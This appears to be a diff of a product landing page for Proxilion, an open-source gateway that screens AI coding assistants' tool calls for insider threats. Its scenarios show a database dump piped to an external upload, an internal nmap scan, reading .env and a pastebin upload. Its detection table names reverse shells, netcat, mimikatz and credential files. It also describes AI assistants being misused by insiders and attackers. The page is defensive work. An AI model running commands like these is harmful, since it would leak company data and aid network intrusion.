-                <h3>Performance</h3>
-
-                <p><strong>Latency (measured under load):</strong></p>
-                <ul>
-                    <li>Pattern analysis: 5-15ms P95</li>
-                    <li>Session state lookup: 2-5ms P95 (Redis)</li>
-                    <li>Semantic analysis: 200-500ms P95 (Claude API, optional)</li>
-                    <li>Total: <50ms P95 without semantic</li>
-                </ul>
-
-                <p><strong>Throughput:</strong></p>
-                <ul>
-                    <li>Single instance: 10,000+ requests/second</li>
-                    <li>Horizontal scaling: Linear (stateless design)</li>
-                    <li>Redis bottleneck: ~100,000 requests/second per cluster</li>
-                </ul>
-
-                <h2>Deployment</h2>
-
-                <p><strong>Self-hosted only.</strong> This is not a SaaS product.</p>
-
-                <p>Security teams will not send internal tool execution logs to third-party APIs. Every command contains proprietary information (internal IPs, database names, employee IDs, project codenames).</p>
-
-                <p>We provide:</p>
-                <ul>
-                    <li>Docker Compose for single-server deployment (10-100 users)</li>
-                    <li>Kubernetes manifests for HA deployment (100-10,000 users)</li>
-                </ul>
-
-                <p>Data never leaves your infrastructure. Source code is auditable. Modify analyzers for your threat model.</p>
-
-                <h2>Real-World Scenarios</h2>
-
-                <div class="scenario-box">
-                    <h4>Scenario 1: Database Exfiltration Prevented</h4>
-                    <p>Employee gives notice on Friday. Monday morning:</p>
-                    <pre><code># Employee to Claude Code: "Help me back up the customer database for documentation"
-pg_dump production_db | gzip | curl -F "file=@-" https://personal-s3-bucket</code></pre>
-
-                    <p><strong>Proxilion Analysis:</strong></p>
-                    <ul>
-                        <li>Database dump tool detected (score: 75)</li>
-                        <li>Compression before transfer (score: +10)</li>
-                        <li>External upload destination (score: +15)</li>
-                        <li><strong>Composite score: 96 - TERMINATE</strong></li>
-                    </ul>
-
-                    <p>Session killed. Security team alerted. Employee account disabled.</p>
+                <div class="stat-item">
+                    <div class="stat-number">358</div>
+                    <div class="stat-label">Tests Passing</div>
                 </div>
-
-                <div class="scenario-box">
-                    <h4>Scenario 2: Compromised Account Contained</h4>
-                    <p>Attacker gains access to developer's Claude Code session via phishing:</p>
-                    <pre><code># Attacker via AI: "Scan the internal network to understand the infrastructure"
-nmap -sV 10.0.0.0/24 -p 22,80,443,3306,5432</code></pre>
-
-                    <p><strong>Proxilion Analysis:</strong></p>
-                    <ul>
-                        <li>Hacking tool detected: nmap (score: 85)</li>
-                        <li>Internal network target (score: +5)</li>
-                        <li>Multi-port scanning (score: +5)</li>
-                        <li><strong>Composite score: 88 - BLOCK</strong></li>
-                    </ul>
-
-                    <p>Command blocked. Reconnaissance prevented. Breach contained before lateral movement.</p>
-                </div>
-
-                <div class="scenario-box">
-                    <h4>Scenario 3: Legitimate Admin Work Allowed</h4>
-                    <p>DevOps engineer during incident response:</p>
-                    <pre><code># Engineer to Claude: "Check if SSH is running on the backup server"
-ssh user@backup-server.internal systemctl status sshd</code></pre>
-
-                    <p><strong>Proxilion Analysis:</strong></p>
-                    <ul>
-                        <li>SSH connection to internal server (score: 45)</li>
-                        <li>systemctl command (legitimate admin) (score: +5)</li>
-                        <li>Conversation context: "incident response" (legitimacy: -10)</li>
-                        <li><strong>Composite score: 40 - ALLOW</strong></li>
-                    </ul>
-
-                    <p>No false positive. Legitimate work allowed.</p>
-                </div>
-
-                <h2>Cost Analysis</h2>
-
-                <p><strong>Infrastructure</strong> (100 developers):</p>
-                <ul>
-                    <li>Self-hosted: $200/month (2x t3.medium + Redis cluster)</li>
-                    <li>Managed cloud: $500/month (ECS Fargate + ElastiCache)</li>
-                </ul>
-
-                <p><strong>Semantic analysis</strong> (optional):</p>
-                <ul>
-                    <li>With prompt caching: $50/month (1,000 requests/day, 62% cost reduction)</li>
-                    <li>Without prompt caching: $130/month</li>
-                    <li>Disabled: $0 (pattern-based detection only)</li>
-                </ul>
-
-                <div class="highlight-box">
-                    <p><strong>Total:</strong> $250-650/month for 100 developers</p>
-                    <p style="margin-top: 15px;"><strong>Value:</strong> Preventing a single $50M data breach = 600,000% ROI</p>
-                </div>
-
-                <h2>Why Now</h2>
-
-                <p>GTG-1002 showed what AI can do when weaponized. That capability now exists inside every organization deploying AI coding assistants to employees.</p>
-
-                <p>The question is not "could an insider weaponize AI tools?" The answer is yes.</p>
-
-                <p>The question is "do you have visibility and controls when it happens?"</p>
-
-                <p>Right now, for most organizations, the answer is no.</p>
-
-                <div style="text-align: center; margin-top: 80px;">
-                    <a href="https://github.com/clay-good/proxilion" class="btn-primary" target="_blank">Get Started on GitHub</a>
+                <div class="stat-item">
+                    <div class="stat-number">MIT</div>
+                    <div class="stat-label">Licensed</div>
                 </div>
             </div>
-        </article>
+        </header>
+
+        <section>
+            <div class="section-header">
+                <h2 class="section-title">How It Works</h2>
+                <p class="section-subtitle">
+                    Proxilion sits between AI assistants and MCP servers, analyzing every tool call before execution.
+                </p>
+            </div>
+
+            <div class="architecture-box">
+                <span class="highlight">AI Assistant</span> (Claude Code, Copilot, Cursor)<br><br>
+                <span style="color: var(--text-muted);">&darr;</span><br><br>
+                <span class="highlight">Proxilion Gateway</span> (analyzes tool call, &lt;50ms)<br><br>
+                <span style="color: var(--text-muted);">&darr;</span><br><br>
+                Decision: <span class="highlight">Allow</span> | <span class="highlight">Alert</span> | <span class="highlight">Block</span> | <span class="highlight">Terminate</span><br><br>
+                <span style="color: var(--text-muted);">&darr;</span><br><br>
+                <span class="highlight">MCP Server</span> executes (or rejects) the tool call
+            </div>
+
+            <div class="features-grid">
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    <h3 class="feature-title">Pattern-Based Detection</h3>
+                    <p class="feature-text">22 analyzers detect credential harvesting, network reconnaissance, exfiltration attempts, hacking tools, and more.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12,6 12,12 16,14"/></svg>
+                    <h3 class="feature-title">Session Correlation</h3>
+                    <p class="feature-text">Track multi-phase attack chains across hours and days. Individual requests might look benign; patterns reveal intent.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22,12 18,12 15,21 9,3 6,12 2,12"/></svg>
+                    <h3 class="feature-title">Kill Chain Tracking</h3>
+                    <p class="feature-text">Detect attack progressions: Reconnaissance &rarr; Credential Access &rarr; Exfiltration. Terminate before damage.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><path d="M3 9h18M9 21V9"/></svg>
+                    <h3 class="feature-title">Custom Policy DSL</h3>
+                    <p class="feature-text">TOML-based rules, allowlists, and blocklists. Security teams define policies; Proxilion enforces them.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 20V10"/><path d="M12 20V4"/><path d="M6 20v-6"/></svg>
+                    <h3 class="feature-title">Prometheus Metrics</h3>
+                    <p class="feature-text">Export metrics to Prometheus. Pre-built Grafana dashboards for threat scores, latency, and detection rates.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17,8 12,3 7,8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                    <h3 class="feature-title">Redis Session Store</h3>
+                    <p class="feature-text">Production-ready session state with Redis. Track user sessions across restarts and scale horizontally.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section-alt">
+            <div class="section-header">
+                <h2 class="section-title">24 Threat Analyzers</h2>
+                <p class="section-subtitle">
+                    Pattern-based and session-aware analyzers running in parallel on every request.
+                </p>
+            </div>
+
+            <table class="analyzer-table">
+                <thead>
+                    <tr>
+                        <th>Category</th>
+                        <th>What It Detects</th>
+                        <th>Examples</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="category">Enumeration</span></td>
+                        <td>Network reconnaissance and scanning</td>
+                        <td>nmap, masscan, port scanning</td>
+                    </tr>
+                    <tr>
+                        <td><span class="category">Credential Access</span></td>
+                        <td>Attempts to read sensitive files</td>
+                        <td>.env, SSH keys, AWS credentials, /etc/shadow</td>
+                    </tr>
+                    <tr>
+                        <td><span class="category">Exfiltration</span></td>
+                        <td>Data leaving the network</td>
+                        <td>curl to external IPs, pastebin uploads, netcat</td>
+                    </tr>
+                    <tr>
+                        <td><span class="category">Hacking Tools</span></td>
+                        <td>Known offensive security tools</td>
+                        <td>metasploit, hashcat, mimikatz, sqlmap</td>
+                    </tr>
+                    <tr>
+                        <td><span class="category">Privilege Escalation</span></td>
+                        <td>Attempts to gain higher access</td>
+                        <td>sudo abuse, SUID binaries, IAM changes</td>
+                    </tr>
+                    <tr>
+                        <td><span class="category">Lateral Movement</span></td>
+                        <td>Moving across internal network</td>
+                        <td>SSH pivoting, RDP, internal network scans</td>
+                    </tr>
+                    <tr>
+                        <td><span class="category">Persistence</span></td>
+                        <td>Establishing persistent access</td>
+                        <td>cron jobs, systemd services, backdoors</td>
+                    </tr>
+                    <tr>
+                        <td><span class="category">Command & Control</span></td>
+                        <td>C2 communication patterns</td>
+                        <td>reverse shells, Cobalt Strike, beaconing</td>
+                    </tr>
+                    <tr>
+                        <td><span class="category">Impact</span></td>
+                        <td>Destructive operations</td>
+                        <td>rm -rf, database drops, file encryption</td>
+                    </tr>
+                    <tr>
+                        <td><span class="category">Session Progression</span></td>
+                        <td>Multi-phase attack chains</td>
+                        <td>Recon &rarr; Access &rarr; Exfil patterns</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section>
+            <div class="section-header">
+                <h2 class="section-title">Real-World Scenarios</h2>
+                <p class="section-subtitle">
+                    How Proxilion detects and prevents attacks in production.
+                </p>
+            </div>
+
+            <div class="scenario-grid">
+                <div class="scenario-card">
+                    <h3 class="scenario-title">Database Exfiltration Prevented</h3>
+                    <p class="scenario-text">Employee gives notice. Monday morning, they ask Claude Code to "help back up the customer database."</p>
+                    <div class="scenario-code">pg_dump production_db | gzip | curl -F "file=@-" https://personal-bucket</div>
+                    <div class="scenario-result">Score: 96 - TERMINATE. Session killed. Security alerted. Account disabled.</div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3 class="scenario-title">Compromised Account Contained</h3>
+                    <p class="scenario-text">Attacker gains access via phishing, uses Claude Code to "scan the infrastructure."</p>
+                    <div class="scenario-code">nmap -sV 10.0.0.0/24 -p 22,80,443,3306,5432</div>
+                    <div class="scenario-result">Score: 88 - BLOCK. Reconnaissance prevented. Breach contained.</div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3 class="scenario-title">Legitimate Admin Work Allowed</h3>
+                    <p class="scenario-text">DevOps engineer during incident response checks if SSH is running on backup server.</p>
+                    <div class="scenario-code">ssh user@backup-server.internal systemctl status sshd</div>
+                    <div class="scenario-result success">Score: 40 - ALLOW. No false positive. Legitimate work continues.</div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3 class="scenario-title">Multi-Phase Attack Detected</h3>
+                    <p class="scenario-text">Attacker spreads requests across 9 hours to avoid detection.</p>
+                    <div class="scenario-code">10:00 AM: nmap scan (85)<br>2:30 PM: cat .env (70)<br>6:45 PM: curl pastebin (65)</div>
+                    <div class="scenario-result">Session Progression: 3 phases detected. Composite: 96 - TERMINATE.</div>
+                </div>
+            </div>
+        </section>
+
+        <section class="section-alt">
+            <div class="section-header">
+                <h2 class="section-title">Operational Modes</h2>
+                <p class="section-subtitle">
+                    Start in monitor mode, graduate to block as you tune thresholds.
+                </p>
+            </div>
+
+            <table class="mode-table">
+                <thead>
+                    <tr>
+                        <th>Mode</th>
+                        <th>Score &lt; 50</th>
+                        <th>Score 50-69</th>
+                        <th>Score 70-89</th>
+                        <th>Score &ge; 90</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>monitor</td>
+                        <td>Allow + Log</td>
+                        <td>Allow + Log</td>
+                        <td>Allow + Log</td>
+                        <td>Allow + Log</td>
+                    </tr>
+                    <tr>
+                        <td>alert</td>
+                        <td>Allow</td>
+                        <td>Allow + Alert</td>
+                        <td>Allow + Alert</td>
+                        <td>Allow + Alert</td>
+                    </tr>
+                    <tr>
+                        <td>block</td>
+                        <td>Allow</td>
+                        <td>Alert</td>
+                        <td>Block</td>
+                        <td>Block</td>
+                    </tr>
+                    <tr>
+                        <td>terminate</td>
+                        <td>Allow</td>
+                        <td>Alert</td>
+                        <td>Block</td>
+                        <td>Block + Kill Session</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section>
+            <div class="section-header">
+                <h2 class="section-title">Built with Rust</h2>
+                <p class="section-subtitle">
+                    Memory-safe, zero-cost abstractions, fearless concurrency.
+                </p>
+            </div>
+
+            <div class="features-grid">
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    <h3 class="feature-title">Memory Safety</h3>
+                    <p class="feature-text">The gateway cannot become an attack vector. No buffer overflows or use-after-free vulnerabilities.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="13,17 18,12 13,7"/><polyline points="6,17 11,12 6,7"/></svg>
+                    <h3 class="feature-title">Zero-Cost Abstractions</h3>
+                    <p class="feature-text">Pattern matching and regex compilation happen at compile time. No runtime overhead.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/></svg>
+                    <h3 class="feature-title">Fearless Concurrency</h3>
+                    <p class="feature-text">Thread-safe session state tracking without locks. Process thousands of requests per second.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12,6 12,12 16,14"/></svg>
+                    <h3 class="feature-title">Predictable Latency</h3>
+                    <p class="feature-text">No garbage collection pauses. Consistent &lt;50ms P95 latency under load.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                    <h3 class="feature-title">Single Binary</h3>
+                    <p class="feature-text">No dependencies, no runtime. Build once, deploy anywhere. Docker or bare metal.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7,10 12,15 17,10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                    <h3 class="feature-title">10,000+ req/sec</h3>
+                    <p class="feature-text">Single instance handles enterprise traffic. Scale horizontally with shared Redis.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section-alt">
+            <div class="section-header">
+                <h2 class="section-title">Self-Hosted Only</h2>
+                <p class="section-subtitle">
+                    Your AI tool execution logs contain proprietary information. They never leave your infrastructure.
+                </p>
+            </div>
+
+            <div class="features-grid">
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
+                    <h3 class="feature-title">Docker Compose</h3>
+                    <p class="feature-text">Single-server deployment for 10-100 users. Up and running in 5 minutes.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22.65 14.39L12 22.13 1.35 14.39a.84.84 0 01-.3-.94l1.22-3.78 2.44-7.51A.42.42 0 014.82 2a.43.43 0 01.58 0 .42.42 0 01.11.18l2.44 7.49h8.1l2.44-7.51A.42.42 0 0118.6 2a.43.43 0 01.58 0 .42.42 0 01.11.18l2.44 7.51L23 13.45a.84.84 0 01-.35.94z"/></svg>
+                    <h3 class="feature-title">Kubernetes</h3>
+                    <p class="feature-text">HA deployment for 100-10,000 users. Manifests included. Scale with HPA.</p>
+                </div>
+
+                <div class="feature-card">
+                    <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a1 1 0 000 1.4l1.6 1.6a1 1 0 001.4 0l3.77-3.77a6 6 0 01-7.94 7.94l-6.91 6.91a2.12 2.12 0 01-3-3l6.91-6.91a6 6 0 017.94-7.94l-3.76 3.76z"/></svg>
+                    <h3 class="feature-title">Auditable</h3>
+                    <p class="feature-text">Source code is open. Security teams can review, audit, and modify analyzers for your threat model.</p>
+                </div>
+            </div>
+        </section>
+
+        <div class="final-cta">
+            <h2>Secure Your AI Coding Assistants</h2>
+            <p>
+                Open source. Self-hosted. Deploy in minutes.
+            </p>
+            <a href="https://github.com/clay-good/proxilion-mcp" class="btn-primary" target="_blank" rel="noopener">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+                View on GitHub
+            </a>
+        </div>
 
         <footer>
-            <p>Built with transparency by <a href="https://github.com/clay-good" target="_blank" rel="noopener">Clay Good</a></p>
-            <p style="margin-top: 15px; font-size: 0.9rem;">Open Source • MIT License • Self-Hosted</p>
+            <p>Built by <a href="https://github.com/clay-good" target="_blank" rel="noopener">Clay Good</a></p>
+            <div class="footer-links">
+                <a href="https://github.com/clay-good/proxilion-sdk">SDK</a>
+                <a href="https://github.com/clay-good/proxilion-mcp">MCP</a>
+                <a href="https://github.com/clay-good/proxilion-grc">GRC</a>
+            </div>
+            <p style="margin-top: 16px; font-size: 0.8rem; color: var(--text-muted);">
+                MIT License &bull; Open Source &bull; Self-Hosted
+            </p>
         </footer>
     </div>
 
